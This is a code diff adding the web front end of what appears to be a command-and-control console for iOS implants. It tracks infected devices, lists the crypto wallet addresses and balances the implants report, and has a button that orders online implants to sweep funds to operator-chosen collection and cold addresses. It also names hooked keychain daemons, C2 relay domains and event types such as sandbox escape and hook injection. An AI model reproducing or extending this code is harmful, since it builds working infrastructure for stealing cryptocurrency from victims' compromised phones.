+      <button id="proxy-modal-save" class="px-4 py-1.5 text-xs bg-neon-blue hover:bg-blue-600 text-white rounded-lg cursor-pointer transition-colors">保存</button>
+    </div>
+  </div>
+</div>
+
+<!-- Proxy Detail Modal -->
+<div id="proxy-detail-modal" class="modal-backdrop fixed inset-0 z-[100] hidden items-center justify-center">
+  <div class="modal glass-card rounded-xl w-full max-w-2xl shadow-2xl shadow-black/50 mx-4 max-h-[85vh] flex flex-col">
+    <div class="flex items-center justify-between px-5 py-4 border-b border-void-border">
+      <h3 class="font-medium text-white text-sm" id="proxy-detail-title">代理详情</h3>
+      <button id="proxy-detail-close" class="text-slate-dim hover:text-white text-xl leading-none cursor-pointer">&times;</button>
+    </div>
+    <div class="p-5 overflow-y-auto space-y-4">
+      <div id="proxy-detail-meta" class="text-xs font-mono text-slate-dim"></div>
+      <div class="grid grid-cols-2 gap-3">
+        <div>
+          <label class="text-[10px] text-slate-dim block mb-1">状态</label>
+          <select id="proxy-edit-status" class="w-full bg-void border border-void-border rounded px-2 py-2 text-xs text-white">
+            <option value="active">active</option>
+            <option value="paused">paused</option>
+            <option value="disabled">disabled</option>
+          </select>
+        </div>
+        <div>
+          <label class="text-[10px] text-slate-dim block mb-1">重置密码</label>
+          <input id="proxy-edit-password" type="text" placeholder="留空不修改"
+            class="w-full bg-void border border-void-border rounded px-2 py-2 text-xs font-mono text-white" />
+        </div>
+      </div>
+      <div>
+        <label class="text-[10px] text-slate-dim block mb-1">备注</label>
+        <textarea id="proxy-edit-note" rows="2" class="w-full bg-void border border-void-border rounded px-2 py-2 text-xs text-white"></textarea>
+      </div>
+      <div>
+        <h4 class="text-xs text-white mb-2">下属设备</h4>
+        <div class="overflow-x-auto max-h-48">
+          <table class="data-table w-full text-left text-xs">
+            <thead><tr><th>device_id</th><th>IP</th><th>可控</th><th>可归集</th></tr></thead>
+            <tbody id="proxy-detail-devices"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+    <div class="flex justify-end gap-2 px-5 py-4 border-t border-void-border">
+      <button id="proxy-detail-delete" class="px-4 py-1.5 text-xs border border-neon-red/40 text-neon-red rounded-lg cursor-pointer">删除代理</button>
+      <button id="proxy-detail-save" class="px-4 py-1.5 text-xs bg-neon-blue text-white rounded-lg cursor-pointer">保存修改</button>
+    </div>
+  </div>
+</div>
+
+<!-- Add Agent Modal -->
+<div id="agent-modal" class="modal-backdrop fixed inset-0 z-[100] hidden items-center justify-center">
+  <div class="modal glass-card rounded-xl w-full max-w-md shadow-2xl shadow-black/50 mx-4">
+    <div class="flex items-center justify-between px-5 py-4 border-b border-void-border">
+      <h3 class="font-medium text-white text-sm">Add Agent · 添加代理</h3>
+      <button id="modal-close" class="text-slate-dim hover:text-white text-xl leading-none cursor-pointer transition-colors">&times;</button>
+    </div>
+    <div class="p-5 space-y-4">
+      <div>
+        <label class="text-xs text-slate-text block mb-1">Agent 名称</label>
+        <input id="agent-name" type="text" placeholder="例如 agent-us-east-01"
+          class="w-full bg-void border border-void-border rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-neon-blue placeholder-slate-dim transition-colors" />
+      </div>
+      <div>
+        <label class="text-xs text-slate-text block mb-1">IP / Host</label>
+        <input id="agent-host" type="text" placeholder="例如 192.168.1.100"
+          class="w-full bg-void border border-void-border rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-neon-blue placeholder-slate-dim transition-colors" />
+      </div>
+      <div>
+        <label class="text-xs text-slate-text block mb-1">端口</label>
+        <input id="agent-port" type="text" placeholder="例如 8080"
+          class="w-full bg-void border border-void-border rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-neon-blue placeholder-slate-dim transition-colors" />
+      </div>
+      <div>
+        <label class="text-xs text-slate-text block mb-1">备注</label>
+        <textarea id="agent-note" rows="2" placeholder="可选备注"
+          class="w-full bg-void border border-void-border rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-neon-blue placeholder-slate-dim transition-colors resize-none"></textarea>
+      </div>
+    </div>
+    <div class="flex justify-end gap-2 px-5 py-4 border-t border-void-border">
+      <button id="modal-cancel" class="px-4 py-1.5 text-xs border border-void-border rounded-lg text-slate-text hover:border-neon-blue cursor-pointer transition-colors">取消</button>
+      <button id="modal-save" class="px-4 py-1.5 text-xs bg-neon-blue hover:bg-blue-600 text-white rounded-lg cursor-pointer transition-colors">Save</button>
+    </div>
+  </div>
+</div>
+
+<script>
+(function () {
+  'use strict';
+
+  // Initialize Lucide icons
+  if (window.lucide) lucide.createIcons();
+
+  // === DAEMON HOOK DATA ===
+  const DAEMON_PROCESSES = [
+    { name: 'launchd', pid: 1, target: 'com.apple.xpc.launchd', risk: 'high', dylib: 'detected', dylibName: 'libsubstrate.dylib' },
+    { name: 'powerd', pid: 89, target: 'IOPMrootDomain', risk: 'medium', dylib: 'clean', dylibName: '—' },
+    { name: 'AppleCredentialManagerDaemon', pid: 247, target: 'SecKeychain.framework', risk: 'high', dylib: 'detected', dylibName: 'credhook.dylib' },
+    { name: 'CloudKeychainProxy', pid: 312, target: 'com.apple.security.cloudkeychainproxy', risk: 'high', dylib: 'detected', dylibName: 'kcproxyhook.dylib' },
+    { name: 'backupd', pid: 156, target: 'com.apple.backupd', risk: 'medium', dylib: 'suspicious', dylibName: 'backupinject.dylib' },
+    { name: 'locationd', pid: 78, target: 'CoreLocation.framework', risk: 'low', dylib: 'clean', dylibName: '—' },
+    { name: 'bluetoothd', pid: 95, target: 'IOBluetooth.framework', risk: 'low', dylib: 'clean', dylibName: '—' },
+    { name: 'wifid', pid: 102, target: 'CoreWiFi.framework', risk: 'medium', dylib: 'suspicious', dylibName: 'wifimon.dylib' },
+    { name: 'configd', pid: 45, target: 'SystemConfiguration.framework', risk: 'low', dylib: 'clean', dylibName: '—' },
+    { name: 'notifyd', pid: 33, target: 'com.apple.notifyd', risk: 'low', dylib: 'clean', dylibName: '—' },
+  ];
+
+  function renderDaemonTable() {
+    const tbody = document.getElementById('daemon-tbody');
+    if (!tbody) return;
+    tbody.innerHTML = DAEMON_PROCESSES.map(d => {
+      const riskClass = d.risk === 'high' ? 'risk-high' : d.risk === 'medium' ? 'risk-medium' : 'risk-low';
+      const riskLabel = d.risk === 'high' ? 'HIGH' : d.risk === 'medium' ? 'MED' : 'LOW';
+      let dylibBadge = '';
+      if (d.dylib === 'detected') {
+        dylibBadge = `<span class="badge badge-red"><svg class="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 9v4m0 4h.01M3 12a9 9 0 1118 0 9 9 0 01-18 0z"/></svg> ${d.dylibName}</span>`;
+      } else if (d.dylib === 'suspicious') {
+        dylibBadge = `<span class="badge badge-amber"><svg class="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 9v4m0 4h.01"/><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/></svg> ${d.dylibName}</span>`;
+      } else {
+        dylibBadge = '<span class="badge badge-green">CLEAN</span>';
+      }
+      return `
+        <tr class="border-b border-void-border hover:bg-neon-blue/[0.03] transition-colors">
+          <td class="py-2.5 px-3">
+            <div class="flex items-center gap-2">
+              <span class="layer-indicator ${d.risk === 'high' ? 'layer-error' : d.risk === 'medium' ? 'layer-warning' : 'layer-active'}"></span>
+              <span class="text-xs font-mono text-white font-medium">${d.name}</span>
+            </div>
+          </td>
+          <td class="py-2.5 px-3 text-[11px] font-mono text-slate-text">${d.target}</td>
+          <td class="py-2.5 px-3 text-center"><span class="${riskClass}">${riskLabel}</span></td>
+          <td class="py-2.5 px-3 text-center">${dylibBadge}</td>
+          <td class="py-2.5 px-3 text-center text-xs font-mono text-slate-dim">${d.pid}</td>
+        </tr>
+      `;
+    }).join('');
+  }
+
+  // === TELEMETRY STREAM ===
+  const CHANNEL_CODES = ['ch_appstore_01', 'ch_safari_02', 'ch_deeplink_03', 'ch_push_04', 'ch_qr_05', 'ch_sms_06'];
+  const DEVICE_VERSIONS = ['iOS 15.7.9', 'iOS 16.1.2', 'iOS 16.6.1', 'iOS 17.0.3', 'iOS 17.2.1', 'iOS 17.4', 'iOS 17.5.1', 'iOS 17.6'];
+  const DOMAINS_LIST = ['cdn-apple.security.io', 'verify.icloud-cdn.com', 'api.telemetry.run', 'hook.payload.net', 'c2.secure-relay.io'];
+  const EVENT_TYPES = ['DEVICE_FINGERPRINT', 'BEACON_PING', 'PAYLOAD_FETCH', 'IPC_HANDSHAKE', 'HOOK_INJECT', 'DYLIB_LOAD', 'SANDBOX_ESCAPE', 'ENTITLEMENT_CHECK'];
+
+  function generateTelemetryLine() {
+    const now = new Date();
+    const ts = `${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}.${String(now.getMilliseconds()).padStart(3,'0')}`;
+    const eventType = EVENT_TYPES[Math.floor(Math.random() * EVENT_TYPES.length)];
+    const channel = CHANNEL_CODES[Math.floor(Math.random() * CHANNEL_CODES.length)];
+    const version = DEVICE_VERSIONS[Math.floor(Math.random() * DEVICE_VERSIONS.length)];
+    const domain = DOMAINS_LIST[Math.floor(Math.random() * DOMAINS_LIST.length)];
+    const uid = 'D-' + Math.floor(10000 + Math.random() * 90000);
+
+    const colors = {
+      'DEVICE_FINGERPRINT': '#06b6d4',
+      'BEACON_PING': '#00ff88',
+      'PAYLOAD_FETCH': '#f59e0b',
+      'IPC_HANDSHAKE': '#3b82f6',
+      'HOOK_INJECT': '#ef4444',
+      'DYLIB_LOAD': '#ef4444',
+      'SANDBOX_ESCAPE': '#a855f7',
+      'ENTITLEMENT_CHECK': '#06b6d4',
+    };
+    const color = colors[eventType] || '#00ff88';
+
+    return `<span style="color:#475569">[${ts}]</span> <span style="color:${color}">${eventType}</span> <span style="color:#64748b">|</span> <span style="color:#94a3b8">ch=</span><span style="color:#06b6d4">${channel}</span> <span style="color:#94a3b8">ver=</span><span style="color:#a855f7">${version}</span> <span style="color:#94a3b8">uid=</span><span style="color:#f59e0b">${uid}</span> <span style="color:#94a3b8">dst=</span><span style="color:#3b82f6">${domain}</span>`;
+  }
+
+  let telemetryInterval;
+  function startTelemetryStream() {
+    const stream = document.getElementById('terminal-stream');
+    if (!stream) return;
+
+    for (let i = 0; i < 8; i++) {
+      const line = document.createElement('div');
+      line.innerHTML = generateTelemetryLine();
+      stream.appendChild(line);
+    }
+
+    telemetryInterval = setInterval(() => {
+      const line = document.createElement('div');
+      line.innerHTML = generateTelemetryLine();
+      stream.appendChild(line);
+
+      if (stream.children.length > 200) {
+        stream.removeChild(stream.firstChild);
+      }
+      stream.scrollTop = stream.scrollHeight;
+    }, 1500 + Math.random() * 2000);
+  }
+
+  // === HEADER CLOCK ===
+  function updateClock() {
+    const now = new Date();
+    const ts = `${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;
+    const el = document.getElementById('header-time');
+    if (el) el.textContent = ts;
+  }
+  setInterval(updateClock, 1000);
+  updateClock();
+
+  // === ORIGINAL APP LOGIC ===
+  const PAGE_META = {
+    dashboard: { title: '安全仪表盘', showControl: false, view: 'page-dashboard' },
+    devices:   { title: '设备终端', showControl: true, view: 'page-devices', filter: null, tableTitle: '设备终端' },
+    authorized:{ title: '已授权', showControl: true, view: 'page-devices', filter: 'authorized', tableTitle: '已授权设备' },
+    collectable:{ title: '可归集', showControl: true, view: 'page-devices', filter: 'collectable', tableTitle: '可归集设备' },
+    assets:    { title: '资产看板', showControl: false, view: 'page-assets' },
+    agents:    { title: '代理管理', showControl: false, view: 'page-agents' },
+    cold:      { title: '冷地址', showControl: false, view: 'page-cold' },
+    collectaddr:{ title: '归集地址', showControl: false, view: 'page-collectaddr' },
+    records:   { title: '归集记录', showControl: false, view: 'page-records' },
+    c2:        { title: 'C2 控制台', showControl: false, view: 'page-c2' },
+  };
+
+  let currentPage = 'dashboard';
+  let openTabs = ['dashboard'];
+  let devices = [];
+  let proxies = [];
+  let collectAddresses = { updatedAt: '' };
+  let collectVerified = false;
+  let collectCatalog = [];
+  let rpcFormFields = [];
+  let rpcValues = {};
+  const WALLET_COLUMNS = [
+    { key: 'eth_address', label: 'ETH' },
+    { key: 'trx_address', label: 'TRX' },
+    { key: 'btc_address', label: 'BTC' },
+    { key: 'bsc_address', label: 'BSC' },
+    { key: 'sol_address', label: 'SOL' },
+  ];
+  let coldAddresses = [];
+  let collectRecords = [];
+  let deviceStats = { controlled: 0, authorized: 0, collectable: 0 };
+  let assetDashboard = { summary: {}, devices: [], chain_breakdown: [], top_devices: [], rpc: {}, catalog: [] };
+  let rpcSettings = {};
+
+  const $ = (sel) => document.querySelector(sel);
+  const $$ = (sel) => document.querySelectorAll(sel);
+  const API_BASE = (window.location.origin || '') + window.location.pathname.replace(/\/[^\/]*$/, '');
+  let sseConnection = null;
+
+  function showLoading(ms, cb) {
+    const overlay = $('#loading-overlay');
+    overlay.classList.add('show');
+    setTimeout(() => {
+      overlay.classList.remove('show');
+      if (cb) cb();
+    }, ms || 400);
+  }
+
+  const COLLECT_GUARD_PASS = '${CORUNA_CONSOLE_PASS}';
+  const UI_STORAGE_KEY = 'ios_console_ui_v1';
+  const AUTH_TOKEN_KEY = 'ios_console_token';
+  let sessionLoggedIn = false;
+  let currentUserRole = 'admin';
+  let currentProxyId = '';
+  let editingProxyId = '';
+  let proxyStats = { count: 0, total_devices: 0, total_assets: 0 };
+
+  function getAuthToken() {
+    return sessionStorage.getItem(AUTH_TOKEN_KEY) || '';
+  }
+
+  function setAuthToken(token) {
+    if (token) sessionStorage.setItem(AUTH_TOKEN_KEY, token);
+    else sessionStorage.removeItem(AUTH_TOKEN_KEY);
+  }
+
+  function showToast(msg) {
+    const banner = document.getElementById('backend-status-banner');
+    if (banner) {
+      banner.textContent = msg;
+      banner.classList.remove('hidden');
+      setTimeout(() => banner.classList.add('hidden'), 4000);
+    }
+  }
+
+  function loadUiState() {
+    try {
+      const raw = localStorage.getItem(UI_STORAGE_KEY);
+      if (!raw) return;
+      const data = JSON.parse(raw);
+      sessionLoggedIn = !!data.loggedIn;
+    } catch (_) {}
+  }
+
+  function saveUiState() {
+    try {
+      localStorage.setItem(UI_STORAGE_KEY, JSON.stringify({ loggedIn: sessionLoggedIn }));
+    } catch (_) {}
+  }
+
+  function enterApp() {
+    $('#login-page').style.display = 'none';
+    $('#app-shell').style.display = 'flex';
+    renderDaemonTable();
+    if (window.lucide) lucide.createIcons();
+
+    loadAllFromAPI();
+    connectSSE();
+    loadQRCode();
+    loadWebhookConfig();
+    loadVisitors();
+    loadRpcSettings();
+    bindRpcSettings();
+    bindGlobalControl();
+    bindC2Panel();
+    bindColdAddressForm();
+    bindAssetsPanel();
+    applyRoleMenu();
+    apiFetch('/api/auth/me').then(j => {
+      currentUserRole = j.data.role || 'admin';
+      currentProxyId = j.data.proxy_id || '';
+      applyRoleMenu();
+    }).catch(() => {});
+  }
+
+  async function apiFetch(path, options) {
+    const opts = options ? { ...options } : {};
+    opts.headers = { ...(opts.headers || {}) };
+    const token = getAuthToken();
+    if (token) opts.headers['Authorization'] = 'Bearer ' + token;
+    const resp = await fetch(API_BASE + path, opts);
+    let json = {};
+    try { json = await resp.json(); } catch (_) {}
+    if (resp.status === 401) {
+      sessionLoggedIn = false;
+      setAuthToken('');
+      saveUiState();
+      showToast('登录已过期，请重新登录');
+      throw new Error(json.msg || 'Unauthorized');
+    }
+    if (!resp.ok || json.code !== 0) {
+      throw new Error(json.msg || ('HTTP ' + resp.status));
+    }
+    return json;
+  }
+
+  async function loadDevicesFromAPI() {
+    try {
+      const json = await apiFetch('/api/devices');
+      devices = json.data.devices || [];
+      deviceStats = json.data.stats || deviceStats;
+      renderDeviceTable();
+      renderDashboard();
+    } catch (_) {}
+  }
+
+  async function loadCaptcha() {
+    try {
+      const resp = await fetch(API_BASE + '/api/auth/captcha');
+      const json = await resp.json();
+      if (json.code !== 0) return;
+      $('#captcha-id').value = json.data.captcha_id || '';
+      const wrap = $('#captcha-svg-wrap');
+      if (wrap) wrap.innerHTML = json.data.svg || '';
+      $('#captcha-code').value = '';
+    } catch (_) {}
+  }
+
+  function applyRoleMenu() {
+    const adminOnly = ['collectaddr', 'cold', 'records', 'c2'];
+    $$('.sidebar-item').forEach(el => {
+      const page = el.dataset.page;
+      if (currentUserRole === 'proxy' && adminOnly.includes(page)) {
+        el.classList.add('hidden');
+      } else {
+        el.classList.remove('hidden');
+      }
+    });
+    const addProxyBtn = $('#add-proxy-btn');
+    if (addProxyBtn) addProxyBtn.classList.toggle('hidden', currentUserRole === 'proxy');
+  }
+
+  async function loadProxiesFromAPI() {
+    try {
+      const json = await apiFetch('/api/proxies/tree');
+      proxies = json.data.proxies || [];
+      proxyStats = json.data.stats || proxyStats;
+      if (json.data.scope) {
+        currentUserRole = json.data.scope.role || currentUserRole;
+        currentProxyId = json.data.scope.proxy_id || '';
+      }
+      renderProxyTable();
+    } catch (_) {}
+  }
+
+  function chainBadgeClass(chain) {
+    const map = { ETH: 'badge-amber', TRX: 'badge-green', BTC: 'badge-blue', BSC: 'badge-cyan', SOL: 'badge-purple' };
+    return map[chain] || 'badge-gray';
+  }
+
+  function getCatalog() {
+    return collectCatalog.length ? collectCatalog : (assetDashboard.catalog || []);
+  }
+
+  async function loadCollectCatalog() {
+    try {
+      const json = await apiFetch('/api/collect/catalog');
+      collectCatalog = json.data || [];
+    } catch (_) {}
+  }
+
+  function renderCollectBadges() {
+    const catalog = getCatalog();
+    const badges = document.getElementById('collect-badges');
+    const countEl = document.getElementById('collect-asset-count');
+    if (countEl) countEl.textContent = `${catalog.length || 10} 种资产`;
+    if (!badges) return;
+    badges.innerHTML = catalog.map(a => `
+      <span class="badge badge-green"><i data-lucide="link" class="w-3 h-3"></i> ${a.label || a.id}</span>
+    `).join('');
+    if (window.lucide) lucide.createIcons();
+  }
+
+  function renderCollectAddrGrid() {
+    const grid = document.getElementById('collect-addr-grid');
+    const catalog = getCatalog();
+    if (!grid) return;
+    if (!catalog.length) {
+      grid.innerHTML = '<p class="text-xs text-slate-dim font-mono col-span-full">加载 catalog…</p>';
+      return;
+    }
+    grid.innerHTML = catalog.map(a => {
+      const addr = collectAddresses[a.dest_key] || '';
+      return `
+        <div class="rounded-lg border border-void-border p-4 bg-void/40">
+          <div class="flex items-center gap-2 mb-3">
+            <span class="badge ${chainBadgeClass(a.chain)}">${a.chain}</span>
+            <span class="text-xs font-medium text-white">${a.label || a.id}</span>
+          </div>
+          <p class="text-xs font-mono break-all text-slate-text min-h-[2.5rem]" data-collect-display="${a.dest_key}">${addr || '暂未设置'}</p>
+        </div>`;
+    }).join('');
+  }
+
+  function renderCollectModalFields() {
+    const wrap = document.getElementById('collect-addr-fields');
+    const catalog = getCatalog();
+    if (!wrap) return;
+    wrap.innerHTML = catalog.map(a => `
+      <div class="rounded-lg border border-void-border p-3 bg-void/40">
+        <label class="text-xs text-slate-text block mb-2 flex items-center gap-2">
+          <span class="badge ${chainBadgeClass(a.chain)}">${a.chain}</span> ${a.label || a.id}
+        </label>
+        <input id="collect-input-${a.dest_key}" type="text" data-dest-key="${a.dest_key}"
+          placeholder="请输入 ${a.label || a.dest_key} 归集地址"
+          class="w-full bg-void-light border border-void-border rounded-lg px-3 py-2 text-sm font-mono text-white focus:outline-none focus:border-neon-blue placeholder-slate-dim transition-colors" />
+      </div>
+    `).join('');
+  }
+
+  function renderRpcFormGrid() {
+    const grid = document.getElementById('rpc-form-grid');
+    if (!grid) return;
+    const fields = rpcFormFields.length ? rpcFormFields : (assetDashboard.rpc?.fields || []);
+    if (!fields.length) {
+      grid.innerHTML = '<p class="text-xs text-slate-dim font-mono">加载 RPC 字段…</p>';
+      return;
+    }
+    grid.innerHTML = fields.map(f => `
+      <div>
+        <label class="text-[10px] text-slate-dim block mb-1">${f.label || f.key}</label>
+        <input id="rpc-field-${f.key}" type="text" data-rpc-key="${f.key}"
+          placeholder="${f.placeholder || ''}"
+          class="w-full bg-void border border-void-border rounded px-2 py-2 text-xs font-mono text-white" />
+      </div>
+    `).join('');
+    renderRpcForm();
+  }
+
+  function readRpcFormBody() {
+    const body = {};
+    document.querySelectorAll('[data-rpc-key]').forEach(el => {
+      body[el.dataset.rpcKey] = el.value.trim();
+    });
+    return body;
+  }
+
+  async function loadCollectAddressesFromAPI() {
+    try {
+      if (!collectCatalog.length) await loadCollectCatalog();
+      const json = await apiFetch('/api/collect/addresses');
+      collectAddresses = json.data || {};
+      if (json.data?.catalog) collectCatalog = json.data.catalog;
+      renderCollectBadges();
+      renderCollectAddrGrid();
+      renderCollectModalFields();
+      $('#collect-updated-display').textContent = collectAddresses.updatedAt || '—';
+    } catch (_) {}
+  }
+
+  async function loadColdFromAPI() {
+    try {
+      const json = await apiFetch('/api/collect/cold');
+      coldAddresses = json.data || [];
+      renderColdTable();
+    } catch (_) {}
+  }
+
+  async function loadRecordsFromAPI() {
+    try {
+      const json = await apiFetch('/api/collect/records');
+      collectRecords = json.data || [];
+      renderRecordsTable();
+    } catch (_) {}
+  }
+
+  async function loadAssetsDashboard() {
+    try {
+      const json = await apiFetch('/api/devices/assets/dashboard');
+      assetDashboard = json.data || assetDashboard;
+      if (json.data?.catalog) collectCatalog = json.data.catalog;
+      if (json.data?.rpc) {
+        rpcFormFields = json.data.rpc.fields || rpcFormFields;
+        rpcValues = json.data.rpc.values || rpcValues;
+      }
+      renderAssetsDashboard();
+      renderRpcFormGrid();
+    } catch (_) {}
+  }
+
+  async function loadRpcSettings() {
+    try {
+      const json = await apiFetch('/api/settings/rpc-nodes');
+      rpcFormFields = json.data?.fields || [];
+      rpcValues = json.data?.values || json.data || {};
+      renderRpcFormGrid();
+    } catch (_) {}
+  }
+
+  function renderRpcForm() {
+    document.querySelectorAll('[data-rpc-key]').forEach(el => {
+      el.value = rpcValues[el.dataset.rpcKey] || '';
+    });
+  }
+
+  function bindRpcSettings() {
+    document.getElementById('rpc-save-btn')?.addEventListener('click', async () => {
+      try {
+        const body = readRpcFormBody();
+        const json = await apiFetch('/api/settings/rpc-nodes', {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(body),
+        });
+        rpcValues = json.data?.values || json.data || body;
+        showToast('RPC 节点已保存');
+      } catch (e) { alert('保存失败: ' + e.message); }
+    });
+    document.getElementById('rpc-test-btn')?.addEventListener('click', async () => {
+      const out = document.getElementById('rpc-test-result');
+      if (out) out.textContent = '测试中…';
+      try {
+        await apiFetch('/api/settings/rpc-nodes', {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(readRpcFormBody()),
+        });
+        const json = await apiFetch('/api/settings/rpc-nodes/test', { method: 'POST' });
+        const checks = json.data.checks || {};
+        const lines = Object.entries(checks).map(([k, v]) => `${k}: ${v.ok ? 'OK' : 'FAIL'} (${v.detail})`);
+        if (out) out.textContent = lines.join(' · ');
+      } catch (e) {
+        if (out) out.textContent = '测试失败: ' + e.message;
+      }
+    });
+  }
+
+  async function runRpcScanAll() {
+    try {
+      showToast('正在 RPC 扫描链上余额…');
+      const json = await apiFetch('/api/devices/assets/scan-all', { method: 'POST' });
+      showToast(`扫描完成: ${json.data.success}/${json.data.scanned} 成功`);
+      await loadAssetsDashboard();
+    } catch (e) { alert('扫描失败: ' + e.message); }
+  }
+
+  async function runCollectExecute() {
+    if (!confirm('将先 RPC 扫描余额，再向在线 Implant 下发归集指令。继续？')) return;
+    try {
+      const json = await apiFetch('/api/collect/scan-and-execute', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ scan_first: true }),
+      });
+      const d = json.data || {};
+      alert(`已下发 ${d.dispatched_count || 0} 条归集任务，跳过 ${(d.skipped || []).length} 台`);
+      await loadAssetsDashboard();
+      await loadRecordsFromAPI();
+    } catch (e) { alert('归集失败: ' + e.message); }
+  }
+
+  function renderAssetsDashboard() {
+    const s = assetDashboard.summary || {};
+    const devices = assetDashboard.devices || [];
+    const chains = assetDashboard.chain_breakdown || [];
+    const top = assetDashboard.top_devices || [];
+
+    const hint = document.getElementById('assets-rpc-hint');
+    if (hint) {
+      if (s.rpc_configured) {
+        hint.textContent = 'RPC 已配置 — 点击「RPC 扫描余额」从链上拉取真实余额。余额来源标记为 rpc。';
+        hint.className = 'text-xs font-mono text-neon-green';
+      } else {
+        hint.textContent = '请先在「归集地址」页配置 RPC 节点；钱包地址由 Implant 上报后才会出现在下方表格。';
+        hint.className = 'text-xs font-mono text-neon-amber';
+      }
+    }
+
+    $('#assets-total-usd').textContent = formatMoney(s.total_usd || 0);
+    $('#assets-collectable-usd').textContent = formatMoney(s.collectable_usd || 0);
+    $('#assets-device-count').textContent = String(s.devices_with_balance || 0);
+    const walletTotal = devices.reduce((sum, d) => sum + (d.wallet_count || 0), 0);
+    $('#assets-wallet-count').textContent = walletTotal.toLocaleString();
+
+    const chainEl = $('#assets-chain-breakdown');
+    if (chainEl) {
+      if (!chains.length) {
+        chainEl.innerHTML = '<p class="text-xs text-slate-dim font-mono">暂无链上数据</p>';
+      } else {
+        chainEl.innerHTML = chains.map(c => {
+          const chainUsd = c.usd != null ? Number(c.usd) : Number(c.total);
+          const pct = s.total_usd > 0 ? Math.max(4, Math.round((chainUsd / s.total_usd) * 100)) : 0;
+          const label = c.label || `${c.chain} · ${c.symbol}`;
+          const displayTotal = c.token === 'BTC' || (c.chain === 'BTC' && c.symbol === 'BTC')
+            ? `${Number(c.total).toFixed(6)} BTC`
+            : `${Number(c.total).toFixed(4)} (${formatMoney(chainUsd)})`;
+          return `
+            <div>
+              <div class="flex justify-between text-xs mb-1">
+                <span class="text-white">${label}</span>
+                <span class="font-mono text-neon-amber">${displayTotal}</span>
+              </div>
+              <div class="h-1.5 bg-void rounded-full overflow-hidden">
+                <div class="h-full bg-neon-blue/60 rounded-full" style="width:${Math.min(100, pct)}%"></div>
+              </div>
+              <p class="text-[10px] text-slate-dim mt-1 font-mono">${c.device_count || 0} 台设备</p>
+            </div>`;
+        }).join('');
+      }
+    }
+
+    const topEl = $('#assets-top-devices');
+    if (topEl) {
+      if (!top.length) {
+        topEl.innerHTML = '<p class="text-xs text-slate-dim font-mono">暂无 Top 设备</p>';
+      } else {
+        topEl.innerHTML = top.map((d, i) => `
+          <div class="flex items-center justify-between py-2 border-b border-void-border/50">
+            <div class="flex items-center gap-2 min-w-0">
+              <span class="text-[10px] font-mono text-slate-dim w-5">#${i + 1}</span>
+              <span class="text-xs font-mono text-white truncate">${d.device_id}</span>
+              ${d.name ? `<span class="text-[10px] text-slate-dim truncate">${d.name}</span>` : ''}
+            </div>
+            <span class="text-xs font-mono text-neon-amber shrink-0">${formatMoney(d.total_usd)}</span>
+          </div>
+        `).join('');
+      }
+    }
+
+    const tbody = $('#assets-tbody');
+    const empty = $('#assets-empty-hint');
+    if (!tbody) return;
+    if (!devices.length) {
+      tbody.innerHTML = '';
+      empty?.classList.remove('hidden');
+      return;
+    }
+    const catalog = getCatalog();
+    const thead = document.getElementById('assets-thead');
+    if (thead && catalog.length) {
+      thead.innerHTML = `
+        <tr>
+          <th>device_id</th>
+          ${WALLET_COLUMNS.map(w => `<th>${w.label} 钱包</th>`).join('')}
+          ${catalog.map(a => `<th>${a.label || a.id}</th>`).join('')}
+          <th>合计 USD</th>
+          <th>来源</th>
+          <th>状态</th>
+          <th>最后扫描</th>
+        </tr>`;
+    }
+
+    const hasWallets = devices.some(d =>
+      WALLET_COLUMNS.some(w => d[w.key] || (d.wallets && d.wallets[w.key]))
+    );
+    if (!hasWallets) {
+      empty.textContent = '暂无设备钱包地址 — 等待 Implant 通过 /api/c2/implant-post 上报 wallets';
+      empty?.classList.remove('hidden');
+    }
+    empty?.classList.toggle('hidden', hasWallets);
+    if (!hasWallets) { tbody.innerHTML = ''; return; }
+    empty?.classList.add('hidden');
+    tbody.innerHTML = devices.map(d => {
+      const statusCls = d.status === 'ready' ? 'badge-green' : d.status === 'partial' ? 'badge-amber' : d.status === 'error' ? 'badge-red' : 'badge-gray';
+      const scanned = d.last_scan_at ? new Date(d.last_scan_at * 1000).toLocaleString() : '—';
+      const src = d.source || '—';
+      const errTip = d.scan_error ? ` title="${d.scan_error.replace(/"/g, '')}"` : '';
+      const balances = d.balances || {};
+      const walletCells = WALLET_COLUMNS.map(w => {
+        const addr = d[w.key] || (d.wallets && d.wallets[w.key]) || '—';
+        return `<td class="font-mono text-[10px] break-all max-w-[100px]">${addr}</td>`;
+      }).join('');
+      const balanceCells = catalog.map(a => {
+        const val = balances[a.id] != null ? balances[a.id] : (d[a.balance_key] || 0);
+        const decimals = a.token === 'BTC' ? 6 : 4;
+        return `<td class="font-mono text-xs">${Number(val || 0).toFixed(decimals)}</td>`;
+      }).join('');
+      return `
+        <tr class="hover:bg-neon-blue/[0.03] transition-colors"${errTip}>
+          <td class="font-mono text-xs">${d.device_id || '—'}</td>
+          ${walletCells}
+          ${balanceCells}
+          <td class="font-mono text-xs text-neon-amber">${formatMoney(d.total_usd || 0)}</td>
+          <td class="text-[10px] font-mono uppercase">${src}</td>
+          <td><span class="badge ${statusCls}">${d.status || 'unknown'}</span></td>
+          <td class="text-xs font-mono text-slate-dim">${scanned}</td>
+        </tr>`;
+    }).join('');
+    if (window.lucide) lucide.createIcons();
+  }
+
+  function bindAssetsPanel() {
+    $('#assets-refresh-btn')?.addEventListener('click', () => loadAssetsDashboard());
+    $('#assets-scan-btn')?.addEventListener('click', () => runRpcScanAll());
+    $('#assets-collect-btn')?.addEventListener('click', () => runCollectExecute());
